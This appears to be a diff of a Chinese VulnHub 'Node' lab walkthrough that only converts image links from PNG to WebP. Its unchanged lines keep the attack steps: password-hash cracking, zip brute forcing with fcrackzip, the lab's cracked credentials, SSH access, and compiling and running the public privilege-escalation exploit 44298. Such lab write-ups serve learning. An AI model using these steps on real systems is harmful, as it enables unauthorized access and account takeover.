@@ -19,7 +19,7 @@ ShowToc: true
 
 ### @-p- -p 1-65535
 
-![VulnHub Node 靶机实战 示意图 1](/images/linux-notes/vulnhub-node/img-01.png)
+![VulnHub Node 靶机实战 示意图 1](/images/linux-notes/vulnhub-node/img-01.webp)
 
 ~ 目录扫描/login
 
@@ -29,7 +29,7 @@ ShowToc: true
 
 ## ！dirbuster
 
-![VulnHub Node 靶机实战 示意图 2](/images/linux-notes/vulnhub-node/img-02.png)
+![VulnHub Node 靶机实战 示意图 2](/images/linux-notes/vulnhub-node/img-02.webp)
 
 ！暴力破解X
 
@@ -37,39 +37,39 @@ ShowToc: true
 
 ## 的账号是否存在
 
-![VulnHub Node 靶机实战 示意图 3](/images/linux-notes/vulnhub-node/img-03.png)
+![VulnHub Node 靶机实战 示意图 3](/images/linux-notes/vulnhub-node/img-03.webp)
 
 ！查看源代码
 
-![VulnHub Node 靶机实战 示意图 4](/images/linux-notes/vulnhub-node/img-04.png)
+![VulnHub Node 靶机实战 示意图 4](/images/linux-notes/vulnhub-node/img-04.webp)
 
-![VulnHub Node 靶机实战 示意图 5](/images/linux-notes/vulnhub-node/img-05.png)
+![VulnHub Node 靶机实战 示意图 5](/images/linux-notes/vulnhub-node/img-05.webp)
 
 ## ！尝试破解密码
 
-![VulnHub Node 靶机实战 示意图 6](/images/linux-notes/vulnhub-node/img-06.png)
+![VulnHub Node 靶机实战 示意图 6](/images/linux-notes/vulnhub-node/img-06.webp)
 
 ~ 破译密码
 
 ## ！hash-identifier （判断加密类型）
 
-![VulnHub Node 靶机实战 示意图 7](/images/linux-notes/vulnhub-node/img-07.png)
+![VulnHub Node 靶机实战 示意图 7](/images/linux-notes/vulnhub-node/img-07.webp)
 
 ## ！www.cmd5.com
 
-![VulnHub Node 靶机实战 示意图 8](/images/linux-notes/vulnhub-node/img-08.png)
+![VulnHub Node 靶机实战 示意图 8](/images/linux-notes/vulnhub-node/img-08.webp)
 
 ## @ 账号(并不是管理员)
 
 tom/spongebob mark/snowflake~ 目录遍历
 
-![VulnHub Node 靶机实战 示意图 9](/images/linux-notes/vulnhub-node/img-09.png)
+![VulnHub Node 靶机实战 示意图 9](/images/linux-notes/vulnhub-node/img-09.webp)
 
-![VulnHub Node 靶机实战 示意图 10](/images/linux-notes/vulnhub-node/img-10.png)
+![VulnHub Node 靶机实战 示意图 10](/images/linux-notes/vulnhub-node/img-10.webp)
 
 @ myP14ceAdm1nAcc0uNT/manchester
 
-![VulnHub Node 靶机实战 示意图 11](/images/linux-notes/vulnhub-node/img-11.png)
+![VulnHub Node 靶机实战 示意图 11](/images/linux-notes/vulnhub-node/img-11.webp)
 
 ## ~ file 查看文件类型
 
@@ -79,27 +79,27 @@ tom/spongebob mark/snowflake~ 目录遍历
 
 ！base64 -d -i myplace.backup > test-d 解码操作-i  忽略换行符
 
-![VulnHub Node 靶机实战 示意图 12](/images/linux-notes/vulnhub-node/img-12.png)
+![VulnHub Node 靶机实战 示意图 12](/images/linux-notes/vulnhub-node/img-12.webp)
 
 ~ zip压缩包！unzip test
 
-![VulnHub Node 靶机实战 示意图 13](/images/linux-notes/vulnhub-node/img-13.png)
+![VulnHub Node 靶机实战 示意图 13](/images/linux-notes/vulnhub-node/img-13.webp)
 
-![VulnHub Node 靶机实战 示意图 13](/images/linux-notes/vulnhub-node/img-13.png)
+![VulnHub Node 靶机实战 示意图 13](/images/linux-notes/vulnhub-node/img-13.webp)
 
 ~爆破加密压缩文件！fcrackzip -u -D -p ./rockyou.txt test@magicword
 
-![VulnHub Node 靶机实战 示意图 14](/images/linux-notes/vulnhub-node/img-14.png)
+![VulnHub Node 靶机实战 示意图 14](/images/linux-notes/vulnhub-node/img-14.webp)
 
-![VulnHub Node 靶机实战 示意图 15](/images/linux-notes/vulnhub-node/img-15.png)
+![VulnHub Node 靶机实战 示意图 15](/images/linux-notes/vulnhub-node/img-15.webp)
 
-![VulnHub Node 靶机实战 示意图 16](/images/linux-notes/vulnhub-node/img-16.png)
+![VulnHub Node 靶机实战 示意图 16](/images/linux-notes/vulnhub-node/img-16.webp)
 
 ## ~ app.js
 
 ！mark:5AYRft73VtFpc84k
 
-![VulnHub Node 靶机实战 示意图 17](/images/linux-notes/vulnhub-node/img-17.png)
+![VulnHub Node 靶机实战 示意图 17](/images/linux-notes/vulnhub-node/img-17.webp)
 
 ~ ssh登陆！ssh mark@192.168.133.129
 
@@ -107,22 +107,22 @@ tom/spongebob mark/snowflake~ 目录遍历
 
 ！cat /etc/issue
 
-![VulnHub Node 靶机实战 示意图 18](/images/linux-notes/vulnhub-node/img-18.png)
+![VulnHub Node 靶机实战 示意图 18](/images/linux-notes/vulnhub-node/img-18.webp)
 
 ~ 本地提权
 
-![VulnHub Node 靶机实战 示意图 19](/images/linux-notes/vulnhub-node/img-19.png)
+![VulnHub Node 靶机实战 示意图 19](/images/linux-notes/vulnhub-node/img-19.webp)
 
 ！searchsploit -m 44298！scp复制脚本@scp 44298.c mark@192.168.133.129:/tmp/44298.c
 
-![VulnHub Node 靶机实战 示意图 20](/images/linux-notes/vulnhub-node/img-20.png)
+![VulnHub Node 靶机实战 示意图 20](/images/linux-notes/vulnhub-node/img-20.webp)
 
 ~ 编译脚本执行提权！gcc 44298.c -o test
 
-![VulnHub Node 靶机实战 示意图 21](/images/linux-notes/vulnhub-node/img-21.png)
+![VulnHub Node 靶机实战 示意图 21](/images/linux-notes/vulnhub-node/img-21.webp)
 
 ！./test
 
-![VulnHub Node 靶机实战 示意图 22](/images/linux-notes/vulnhub-node/img-22.png)
+![VulnHub Node 靶机实战 示意图 22](/images/linux-notes/vulnhub-node/img-22.webp)
 
-![VulnHub Node 靶机实战 示意图 23](/images/linux-notes/vulnhub-node/img-23.png)
+![VulnHub Node 靶机实战 示意图 23](/images/linux-notes/vulnhub-node/img-23.webp)
